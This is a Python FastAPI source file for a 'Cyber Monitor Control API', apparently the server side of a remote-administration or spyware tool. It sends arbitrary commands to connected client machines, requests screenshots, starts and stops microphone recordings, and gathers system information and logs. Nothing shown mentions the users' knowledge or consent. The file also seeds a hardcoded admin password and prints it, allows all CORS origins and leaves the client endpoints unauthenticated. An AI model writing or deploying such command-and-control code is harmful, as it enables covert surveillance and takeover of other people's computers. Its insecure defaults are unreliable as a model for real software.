import os
import sys
from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, Request, status
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel, Field
from typing import List, Dict, Optional, Any
from datetime import datetime, timedelta
import secrets
import json
from supabase import create_client, Client
from dotenv import load_dotenv
import jwt
import bcrypt
import base64
import asyncio

# Load environment variables
load_dotenv()

# Create FastAPI app
app = FastAPI(
    title="Cyber Monitor Control API",
    version="3.0",
    description="Client monitoring and management system",
    docs_url="/docs",
    redoc_url="/redoc",
    openapi_url="/openapi.json"
)

# CORS Configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ========== ENVIRONMENT VARIABLES ==========
SUPABASE_URL = os.getenv("SUPABASE_URL", "")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "")
JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", secrets.token_urlsafe(32))
PORT = int(os.getenv("PORT", "8000"))

# Initialize Supabase
supabase: Optional[Client] = None

# Security
security = HTTPBearer()

# ========== DATA MODELS ==========
class LoginRequest(BaseModel):
    email: str = Field(..., example="admin@system.io")
    password: str = Field(..., example="password123")

class ClientRegister(BaseModel):
    client_id: str = Field(..., example="client-001")
    name: str = Field(..., example="Office Computer")
    ip_address: str = Field(..., example="192.168.1.100")
    os_info: str = Field(default="Windows", example="Windows 11")

class CommandRequest(BaseModel):
    client_id: str = Field(..., example="client-001")
    command: str = Field(..., example="get_processes")
    parameters: Dict[str, Any] = Field(default_factory=dict)

class ScreenshotUpload(BaseModel):
    client_id: str = Field(..., example="client-001")
    image_data: str = Field(..., description="Base64 encoded image")
    filename: str = Field(..., example="screenshot_2024.png")

class AudioUpload(BaseModel):
    client_id: str = Field(..., example="client-001")
    audio_data: str = Field(..., description="Base64 encoded audio")
    filename: str = Field(..., example="recording_2024.mp3")

class LogEntry(BaseModel):
    client_id: str = Field(..., example="client-001")
    log_type: str = Field(..., example="info")
    message: str = Field(..., example="System started")

# ========== SECURITY FUNCTIONS ==========
def hash_password(password: str) -> str:
    """Hash password using bcrypt"""
    salt = bcrypt.gensalt()
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed.decode('utf-8')

def verify_password(plain_password: str, hashed_password: str) -> bool:
    """Verify password"""
    try:
        return bcrypt.checkpw(plain_password.encode('utf-8'), hashed_password.encode('utf-8'))
    except Exception:
        return False

def create_jwt_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    """Create JWT token"""
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(hours=24)
    
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, JWT_SECRET_KEY, algorithm="HS256")
    return encoded_jwt

def verify_jwt_token(token: str) -> Optional[dict]:
    """Verify JWT token"""
    try:
        payload = jwt.decode(token, JWT_SECRET_KEY, algorithms=["HS256"])
        return payload
    except jwt.PyJWTError:
        return None

async def authenticate_user(credentials: HTTPAuthorizationCredentials = Depends(security)) -> dict:
    """Verify JWT token from request"""
    token = credentials.credentials
    payload = verify_jwt_token(token)
    
    if not payload:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid authentication credentials",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    return payload

# ========== DATABASE INITIALIZATION ==========
@app.on_event("startup")
async def startup_event():
    """Initialize database on startup"""
    global supabase
    
    try:
        if not SUPABASE_URL or not SUPABASE_KEY:
            print("⚠️  Supabase credentials not set")
            print("💡 Please set SUPABASE_URL and SUPABASE_KEY environment variables")
            print(f"📝 Using placeholder values for development")
            
            # For development without Supabase
            supabase = None
            return
        
        print(f"🔗 Initializing Supabase connection...")
        supabase_client = create_client(SUPABASE_URL, SUPABASE_KEY)
        
        # Test connection with simple query
        try:
            test_response = supabase_client.table("users").select("count", count="exact").limit(1).execute()
            print(f"✅ Database connected successfully")
            
            # Check if admin user exists, create if not
            admin_email = "admin@system.io"
            admin_response = supabase_client.table("users").select("*").eq("email", admin_email).execute()
            
            if not admin_response.data:
                hashed_pw = hash_password("password123")
                supabase_client.table("users").insert({
                    "email": admin_email,
                    "password_hash": hashed_pw,
                    "is_admin": True,
                    "is_active": True,
                    "created_at": datetime.utcnow().isoformat()
                }).execute()
                print(f"✅ Created admin user: {admin_email} / password123")
            
        except Exception as e:
            print(f"❌ Database test failed: {str(e)}")
            print("💡 Please create the tables in Supabase using the SQL schema")
            print("💡 Or check your Supabase credentials")
            supabase = None
            return
        
        supabase = supabase_client
        
    except Exception as e:
        print(f"❌ Startup error: {str(e)}")
        import traceback
        traceback.print_exc()
        supabase = None

# ========== WEBSOCKET MANAGER ==========
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}
        self.client_connections: Dict[str, WebSocket] = {}
        self.admin_connections: List[WebSocket] = []

    async def connect_admin(self, websocket: WebSocket):
        await websocket.accept()
        self.admin_connections.append(websocket)
        print(f"👑 Admin connected. Total admins: {len(self.admin_connections)}")

    async def connect_client(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        self.client_connections[client_id] = websocket
        print(f"🖥️  Client connected: {client_id}. Total clients: {len(self.client_connections)}")
        
        # Notify admins
        await self.notify_admins({
            "type": "client_connected",
            "client_id": client_id,
            "timestamp": datetime.utcnow().isoformat()
        })

    def disconnect(self, websocket: WebSocket):
        # Remove from admin connections
        if websocket in self.admin_connections:
            self.admin_connections.remove(websocket)
            print(f"👑 Admin disconnected. Total admins: {len(self.admin_connections)}")
        
        # Remove from client connections
        client_id = None
        for cid, ws in self.client_connections.items():
            if ws == websocket:
                client_id = cid
                break
        
        if client_id:
            del self.client_connections[client_id]
            print(f"🖥️  Client disconnected: {client_id}. Total clients: {len(self.client_connections)}")
            # Notify admins
            asyncio.create_task(self.notify_admins({
                "type": "client_disconnected",
                "client_id": client_id,
                "timestamp": datetime.utcnow().isoformat()
            }))

    async def notify_admins(self, message: dict):
        """Send message to all admin connections"""
        disconnected = []
        for connection in self.admin_connections:
            try:
                await connection.send_json(message)
            except Exception as e:
                print(f"❌ Failed to send to admin: {e}")
                disconnected.append(connection)
        
        # Remove disconnected admins
        for connection in disconnected:
            if connection in self.admin_connections:
                self.admin_connections.remove(connection)

    async def send_to_client(self, client_id: str, message: dict) -> bool:
        """Send message to specific client"""
        if client_id in self.client_connections:
            try:
                await self.client_connections[client_id].send_json(message)
                return True
            except Exception as e:
                print(f"❌ Failed to send to client {client_id}: {e}")
                # Remove disconnected client
                if client_id in self.client_connections:
                    del self.client_connections[client_id]
                return False
        return False

manager = ConnectionManager()

# ========== API ROUTES ==========
@app.post("/api/login", response_model=dict)
async def login(data: LoginRequest):
    """Login endpoint"""
    try:
        if supabase is None:
            # For development without database
            if data.email == "admin@system.io" and data.password == "password123":
                token_data = {
                    "sub": "admin@system.io",
                    "email": "admin@system.io",
                    "is_admin": True,
                    "user_id": "dev-admin-001"
                }
                access_token = create_jwt_token(token_data)
                
                return {
                    "success": True,
                    "token": access_token,
                    "user": {
                        "email": "admin@system.io",
                        "is_admin": True
                    }
                }
            else:
                raise HTTPException(status_code=401, detail="Invalid credentials")
        
        # Check if user exists in database
        response = supabase.table("users") \
            .select("*") \
            .eq("email", data.email) \
            .execute()
        
        if not response.data:
            raise HTTPException(status_code=401, detail="Invalid credentials")
        
        user = response.data[0]
        
        # Verify password
        if not verify_password(data.password, user["password_hash"]):
            raise HTTPException(status_code=401, detail="Invalid credentials")
        
        # Check if user is active
        if not user.get("is_active", True):
            raise HTTPException(status_code=401, detail="Account disabled")
        
        # Create JWT token
        token_data = {
            "sub": user["email"],
            "email": user["email"],
            "is_admin": user.get("is_admin", False),
            "user_id": str(user["id"])
        }
        access_token = create_jwt_token(token_data)
        
        # Update last login
        try:
            supabase.table("users") \
                .update({"last_login": datetime.utcnow().isoformat()}) \
                .eq("id", user["id"]) \
                .execute()
        except Exception as e:
            print(f"⚠️ Failed to update last login: {e}")
        
        return {
            "success": True,
            "token": access_token,
            "user": {
                "email": user["email"],
                "is_admin": user.get("is_admin", False)
            }
        }
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"❌ Login error: {str(e)}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/register-client", response_model=dict)
async def register_client(data: ClientRegister, request: Request):
    """Register a new client"""
    try:
        if supabase is None:
            # For development without database
            return {
                "success": True, 
                "message": "Client registered (development mode)",
                "client_id": data.client_id
            }
        
        # Get client IP from request
        if not data.ip_address or data.ip_address == "127.0.0.1":
            data.ip_address = request.client.host if request.client else "Unknown"
        
        # Check if client exists
        response = supabase.table("clients") \
            .select("*") \
            .eq("client_id", data.client_id) \
            .execute()
        
        client_data = {
            "client_id": data.client_id,
            "name": data.name,
            "ip_address": data.ip_address,
            "os_info": data.os_info,
            "last_seen": datetime.utcnow().isoformat(),
            "online": True,
            "registered_at": datetime.utcnow().isoformat()
        }
        
        if response.data:
            # Update existing client
            supabase.table("clients") \
                .update(client_data) \
                .eq("client_id", data.client_id) \
                .execute()
            client_id = response.data[0]["id"]
        else:
            # Create new client
            insert_response = supabase.table("clients") \
                .insert(client_data) \
                .execute()
            client_id = insert_response.data[0]["id"]
        
        # Add log entry
        try:
            supabase.table("logs").insert({
                "client_id": client_id,
                "log_type": "info",
                "message": f"Client registered: {data.name} ({data.client_id})",
                "created_at": datetime.utcnow().isoformat()
            }).execute()
        except Exception as e:
            print(f"⚠️ Log insertion error: {str(e)}")
        
        return {
            "success": True, 
            "message": "Client registered",
            "client_id": data.client_id
        }
        
    except Exception as e:
        print(f"❌ Client registration error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/clients", response_model=dict)
async def get_clients(_: dict = Depends(authenticate_user)):
    """Get all clients"""
    try:
        if supabase is None:
            # Return mock data for development
            mock_clients = [
                {
                    "id": "dev-001",
                    "client_id": "client-001",
                    "name": "Development Client",
                    "ip_address": "192.168.1.100",
                    "os_info": "Windows 11",
                    "online": True,
                    "last_seen": datetime.utcnow().isoformat(),
                    "registered_at": datetime.utcnow().isoformat()
                }
            ]
            return {"success": True, "clients": mock_clients}
        
        response = supabase.table("clients") \
            .select("*") \
            .order("last_seen", desc=True) \
            .execute()
        
        return {"success": True, "clients": response.data}
    except Exception as e:
        print(f"❌ Get clients error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/client/{client_id}", response_model=dict)
async def get_client(client_id: str, _: dict = Depends(authenticate_user)):
    """Get specific client"""
    try:
        if supabase is None:
            # Return mock data for development
            mock_client = {
                "id": "dev-001",
                "client_id": client_id,
                "name": "Development Client",
                "ip_address": "192.168.1.100",
                "os_info": "Windows 11",
                "online": True,
                "last_seen": datetime.utcnow().isoformat(),
                "registered_at": datetime.utcnow().isoformat()
            }
            return {"success": True, "client": mock_client}
        
        response = supabase.table("clients") \
            .select("*") \
            .eq("client_id", client_id) \
            .execute()
        
        if not response.data:
            raise HTTPException(status_code=404, detail="Client not found")
        
        return {"success": True, "client": response.data[0]}
    except HTTPException:
        raise
    except Exception as e:
        print(f"❌ Get client error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/commands", response_model=dict)
async def get_commands(
    _: dict = Depends(authenticate_user),
    client_id: Optional[str] = None,
    limit: int = 50
):
    """Get recent commands"""
    try:
        if supabase is None:
            # Return mock data for development
            mock_commands = [
                {
                    "id": "cmd-001",
                    "client_id": "dev-001",
                    "command": "get_system_info",
                    "parameters": {},
                    "status": "completed",
                    "result": "System information retrieved",
                    "created_at": datetime.utcnow().isoformat(),
                    "completed_at": datetime.utcnow().isoformat(),
                    "clients": {
                        "client_id": "client-001",
                        "name": "Development Client"
                    }
                }
            ]
            return {"success": True, "commands": mock_commands}
        
        query = supabase.table("commands") \
            .select("*, clients(client_id, name)") \
            .order("created_at", desc=True) \
            .limit(limit)
        
        if client_id:
            client_res = supabase.table("clients") \
                .select("id") \
                .eq("client_id", client_id) \
                .execute()
            if client_res.data:
                query = query.eq("client_id", client_res.data[0]["id"])
        
        response = query.execute()
        return {"success": True, "commands": response.data}
    except Exception as e:
        print(f"❌ Get commands error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/screenshots", response_model=dict)
async def get_screenshots(
    _: dict = Depends(authenticate_user),
    client_id: Optional[str] = None,
    limit: int = 12
):
    """Get recent screenshots"""
    try:
        if supabase is None:
            # Return mock data for development
            mock_screenshots = [
                {
                    "id": "scr-001",
                    "client_id": "dev-001",
                    "filename": "screenshot_2024.png",
                    "created_at": datetime.utcnow().isoformat(),
                    "clients": {
                        "client_id": "client-001",
                        "name": "Development Client"
                    }
                }
            ]
            return {"success": True, "screenshots": mock_screenshots}
        
        query = supabase.table("screenshots") \
            .select("*, clients(client_id, name)") \
            .order("created_at", desc=True) \
            .limit(limit)
        
        if client_id:
            client_res = supabase.table("clients") \
                .select("id") \
                .eq("client_id", client_id) \
                .execute()
            if client_res.data:
                query = query.eq("client_id", client_res.data[0]["id"])
        
        response = query.execute()
        return {"success": True, "screenshots": response.data}
    except Exception as e:
        print(f"❌ Get screenshots error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/audio", response_model=dict)
async def get_audio(
    _: dict = Depends(authenticate_user),
    client_id: Optional[str] = None,
    limit: int = 10
):
    """Get recent audio recordings"""
    try:
        if supabase is None:
            # Return mock data for development
            mock_audio = [
                {
                    "id": "aud-001",
                    "client_id": "dev-001",
                    "filename": "recording_2024.mp3",
                    "created_at": datetime.utcnow().isoformat(),
                    "clients": {
                        "client_id": "client-001",
                        "name": "Development Client"
                    }
                }
            ]
            return {"success": True, "audio_recordings": mock_audio}
        
        query = supabase.table("audio_recordings") \
            .select("*, clients(client_id, name)") \
            .order("created_at", desc=True) \
            .limit(limit)
        
        if client_id:
            client_res = supabase.table("clients") \
                .select("id") \
                .eq("client_id", client_id) \
                .execute()
            if client_res.data:
                query = query.eq("client_id", client_res.data[0]["id"])
        
        response = query.execute()
        return {"success": True, "audio_recordings": response.data}
    except Exception as e:
        print(f"❌ Get audio error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/logs", response_model=dict)
async def get_logs(
    _: dict = Depends(authenticate_user),
    client_id: Optional[str] = None,
    log_type: Optional[str] = None,
    limit: int = 100
):
    """Get system logs"""
    try:
        if supabase is None:
            # Return mock data for development
            mock_logs = [
                {
                    "id": "log-001",
                    "client_id": "dev-001",
                    "log_type": "info",
                    "message": "System started successfully",
                    "created_at": datetime.utcnow().isoformat(),
                    "clients": {
                        "client_id": "client-001",
                        "name": "Development Client"
                    }
                }
            ]
            return {"success": True, "logs": mock_logs}
        
        query = supabase.table("logs") \
            .select("*, clients(client_id, name)") \
            .order("created_at", desc=True) \
            .limit(limit)
        
        if client_id:
            client_res = supabase.table("clients") \
                .select("id") \
                .eq("client_id", client_id) \
                .execute()
            if client_res.data:
                query = query.eq("client_id", client_res.data[0]["id"])
        
        if log_type and log_type != "all":
            query = query.eq("log_type", log_type)
        
        response = query.execute()
        return {"success": True, "logs": response.data}
    except Exception as e:
        print(f"❌ Get logs error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/command", response_model=dict)
async def send_command(data: CommandRequest, _: dict = Depends(authenticate_user)):
    """Send command to client"""
    try:
        if supabase is None:
            # For development without database
            command_id = f"cmd-dev-{int(datetime.utcnow().timestamp())}"
            
            # Try to send via WebSocket
            sent = await manager.send_to_client(data.client_id, {
                "type": "command",
                "command_id": command_id,
                "command": data.command,
                "parameters": data.parameters
            })
            
            return {
                "success": True,
                "command_id": command_id,
                "sent_via_websocket": sent,
                "message": "Command sent (development mode)"
            }
        
        # Get client ID
        client_res = supabase.table("clients") \
            .select("id") \
            .eq("client_id", data.client_id) \
            .execute()
        
        if not client_res.data:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Create command record
        command_res = supabase.table("commands").insert({
            "client_id": client_res.data[0]["id"],
            "command": data.command,
            "parameters": data.parameters,
            "status": "pending",
            "created_at": datetime.utcnow().isoformat()
        }).execute()
        
        command_id = command_res.data[0]["id"]
        
        # Try to send via WebSocket
        sent = await manager.send_to_client(data.client_id, {
            "type": "command",
            "command_id": command_id,
            "command": data.command,
            "parameters": data.parameters
        })
        
        if not sent:
            # Update command status if WebSocket failed
            supabase.table("commands") \
                .update({"status": "failed", "error": "Client not connected"}) \
                .eq("id", command_id) \
                .execute()
        
        return {
            "success": True,
            "command_id": command_id,
            "sent_via_websocket": sent
        }
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"❌ Send command error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/screenshot/{client_id}", response_model=dict)
async def request_screenshot(client_id: str, _: dict = Depends(authenticate_user)):
    """Request screenshot from client"""
    try:
        # Send via WebSocket
        sent = await manager.send_to_client(client_id, {
            "type": "screenshot_request"
        })
        
        if sent:
            return {
                "success": True,
                "message": "Screenshot request sent"
            }
        else:
            raise HTTPException(status_code=404, detail="Client not connected")
            
    except HTTPException:
        raise
    except Exception as e:
        print(f"❌ Screenshot request error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/upload-screenshot", response_model=dict)
async def upload_screenshot(data: ScreenshotUpload, _: dict = Depends(authenticate_user)):
    """Upload screenshot from client"""
    try:
        if supabase is None:
            screenshot_id = f"scr-dev-{int(datetime.utcnow().timestamp())}"
            
            # Notify admins
            await manager.notify_admins({
                "type": "screenshot_received",
                "client_id": data.client_id,
                "screenshot_id": screenshot_id,
                "filename": data.filename,
                "timestamp": datetime.utcnow().isoformat()
            })
            
            return {
                "success": True,
                "screenshot_id": screenshot_id,
                "message": "Screenshot uploaded (development mode)"
            }
        
        # Get client ID
        client_res = supabase.table("clients") \
            .select("id") \
            .eq("client_id", data.client_id) \
            .execute()
        
        if not client_res.data:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Store screenshot
        screenshot_res = supabase.table("screenshots").insert({
            "client_id": client_res.data[0]["id"],
            "image_data": data.image_data,
            "filename": data.filename,
            "created_at": datetime.utcnow().isoformat()
        }).execute()
        
        # Notify admins
        await manager.notify_admins({
            "type": "screenshot_received",
            "client_id": data.client_id,
            "screenshot_id": screenshot_res.data[0]["id"],
            "filename": data.filename,
            "timestamp": datetime.utcnow().isoformat()
        })
        
        return {"success": True, "screenshot_id": screenshot_res.data[0]["id"]}
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"❌ Screenshot upload error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/upload-audio", response_model=dict)
async def upload_audio(data: AudioUpload, _: dict = Depends(authenticate_user)):
    """Upload audio recording from client"""
    try:
        if supabase is None:
            audio_id = f"aud-dev-{int(datetime.utcnow().timestamp())}"
            
            # Notify admins
            await manager.notify_admins({
                "type": "audio_received",
                "client_id": data.client_id,
                "audio_id": audio_id,
                "filename": data.filename,
                "timestamp": datetime.utcnow().isoformat()
            })
            
            return {
                "success": True,
                "audio_id": audio_id,
                "message": "Audio uploaded (development mode)"
            }
        
        # Get client ID
        client_res = supabase.table("clients") \
            .select("id") \
            .eq("client_id", data.client_id) \
            .execute()
        
        if not client_res.data:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Store audio
        audio_res = supabase.table("audio_recordings").insert({
            "client_id": client_res.data[0]["id"],
            "audio_data": data.audio_data,
            "filename": data.filename,
            "created_at": datetime.utcnow().isoformat()
        }).execute()
        
        # Notify admins
        await manager.notify_admins({
            "type": "audio_received",
            "client_id": data.client_id,
            "audio_id": audio_res.data[0]["id"],
            "filename": data.filename,
            "timestamp": datetime.utcnow().isoformat()
        })
        
        return {"success": True, "audio_id": audio_res.data[0]["id"]}
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"❌ Audio upload error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/audio/{client_id}/record", response_model=dict)
async def record_audio(client_id: str, duration: int = 10, _: dict = Depends(authenticate_user)):
    """Request audio recording from client"""
    try:
        # Send via WebSocket
        sent = await manager.send_to_client(client_id, {
            "type": "audio_record",
            "duration": duration
        })
        
        if sent:
            return {
                "success": True,
                "message": f"Audio recording requested for {duration} seconds"
            }
        else:
            raise HTTPException(status_code=404, detail="Client not connected")
            
    except HTTPException:
        raise
    except Exception as e:
        print(f"❌ Audio record request error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/audio/{client_id}/stop", response_model=dict)
async def stop_audio(client_id: str, _: dict = Depends(authenticate_user)):
    """Stop audio recording on client"""
    try:
        # Send via WebSocket
        sent = await manager.send_to_client(client_id, {
            "type": "audio_stop"
        })
        
        if sent:
            return {
                "success": True,
                "message": "Audio recording stopped"
            }
        else:
            raise HTTPException(status_code=404, detail="Client not connected")
            
    except HTTPException:
        raise
    except Exception as e:
        print(f"❌ Audio stop error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

# ========== WEBSOCKET ENDPOINTS ==========
@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    """WebSocket endpoint for admin dashboard"""
    await manager.connect_admin(websocket)
    try:
        while True:
            data = await websocket.receive_json()
            print(f"👑 Admin WebSocket message: {data}")
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception as e:
        print(f"❌ Admin WebSocket error: {str(e)}")
        manager.disconnect(websocket)

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    """WebSocket endpoint for client connections"""
    await manager.connect_client(websocket, client_id)
    try:
        # Update client status
        if supabase:
            try:
                supabase.table("clients").update({
                    "online": True,
                    "last_seen": datetime.utcnow().isoformat()
                }).eq("client_id", client_id).execute()
            except Exception as e:
                print(f"⚠️ Client status update error: {e}")
        
        while True:
            data = await websocket.receive_json()
            data_type = data.get("type")
            
            if data_type == "heartbeat":
                # Update last seen
                if supabase:
                    try:
                        supabase.table("clients").update({
                            "last_seen": datetime.utcnow().isoformat(),
                            "online": True
                        }).eq("client_id", client_id).execute()
                    except:
                        pass
                
            elif data_type == "command_result":
                # Update command status
                if supabase:
                    try:
                        supabase.table("commands").update({
                            "status": "completed",
                            "result": data.get("result"),
                            "completed_at": datetime.utcnow().isoformat()
                        }).eq("id", data.get("command_id")).execute()
                    except:
                        pass
                
                # Notify admins
                await manager.notify_admins({
                    "type": "command_result",
                    "client_id": client_id,
                    "command_id": data.get("command_id"),
                    "result": data.get("result"),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
            elif data_type == "log":
                # Store log
                if supabase:
                    try:
                        client_res = supabase.table("clients") \
                            .select("id") \
                            .eq("client_id", client_id) \
                            .execute()
                        if client_res.data:
                            supabase.table("logs").insert({
                                "client_id": client_res.data[0]["id"],
                                "log_type": data.get("log_type", "info"),
                                "message": data.get("message", ""),
                                "created_at": datetime.utcnow().isoformat()
                            }).execute()
                    except:
                        pass
                
                # Notify admins
                await manager.notify_admins({
                    "type": "client_log",
                    "client_id": client_id,
                    "log_type": data.get("log_type", "info"),
                    "message": data.get("message", ""),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
            elif data_type == "system_info":
                # Store system info
                if supabase:
                    try:
                        client_res = supabase.table("clients") \
                            .select("id") \
                            .eq("client_id", client_id) \
                            .execute()
                        if client_res.data:
                            supabase.table("system_info").insert({
                                "client_id": client_res.data[0]["id"],
                                "info": data.get("info", {}),
                                "created_at": datetime.utcnow().isoformat()
                            }).execute()
                    except:
                        pass
                
                # Notify admins
                await manager.notify_admins({
                    "type": "system_info",
                    "client_id": client_id,
                    "info": data.get("info", {}),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
    except WebSocketDisconnect:
        # Mark client as offline
        if supabase:
            try:
                supabase.table("clients").update({
                    "online": False
                }).eq("client_id", client_id).execute()
            except:
                pass
        manager.disconnect(websocket)
    except Exception as e:
        print(f"❌ Client WebSocket error: {str(e)}")
        # Mark client as offline
        if supabase:
            try:
                supabase.table("clients").update({
                    "online": False
                }).eq("client_id", client_id).execute()
            except:
                pass
        manager.disconnect(websocket)

# ========== HEALTH AND INFO ==========
@app.get("/api/health", response_model=dict)
async def health_check():
    """Health check endpoint"""
    health_status = {
        "status": "healthy" if supabase else "unhealthy",
        "timestamp": datetime.utcnow().isoformat(),
        "version": "3.0",
        "database": "connected" if supabase else "disconnected",
        "active_clients": len(manager.client_connections),
        "active_admins": len(manager.admin_connections),
        "environment": os.getenv("RENDER", "development")
    }
    
    # Test database connection
    if supabase:
        try:
            supabase.table("users").select("count", count="exact").limit(1).execute()
            health_status["database"] = "connected"
        except Exception as e:
            health_status["database"] = f"error: {str(e)}"
            health_status["status"] = "degraded"
    
    return health_status

@app.get("/", response_model=dict)
async def root():
    """Root endpoint with API info"""
    return {
        "message": "🚀 Cyber Monitor Control API",
        "version": "3.0",
        "status": "running",
        "database": "connected" if supabase else "disconnected",
        "timestamp": datetime.utcnow().isoformat(),
        "endpoints": {
            "login": "POST /api/login",
            "register_client": "POST /api/register-client",
            "clients": "GET /api/clients",
            "commands": "GET /api/commands",
            "screenshots": "GET /api/screenshots",
            "audio": "GET /api/audio",
            "logs": "GET /api/logs",
            "health": "GET /api/health",
            "documentation": "/docs"
        },
        "websocket": {
            "admin": "/ws/admin",
            "client": "/ws/client/{client_id}"
        }
    }

# This allows the app to be run directly or imported
if __name__ == "__main__":
    print(f"🚀 Starting Cyber Monitor Control API")
    print(f"📡 Port: {PORT}")
    print(f"🔗 Supabase: {'Connected' if supabase else 'Disconnected'}")
    print(f"👥 Active connections: 0")
    print(f"📚 Documentation: http://localhost:{PORT}/docs")
    print(f"🌐 WebSocket endpoints:")
    print(f"   • Admin: ws://localhost:{PORT}/ws/admin")
    print(f"   • Client: ws://localhost:{PORT}/ws/client/{{client_id}}")
    
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=PORT,
        reload=True,
        log_level="info"
    )
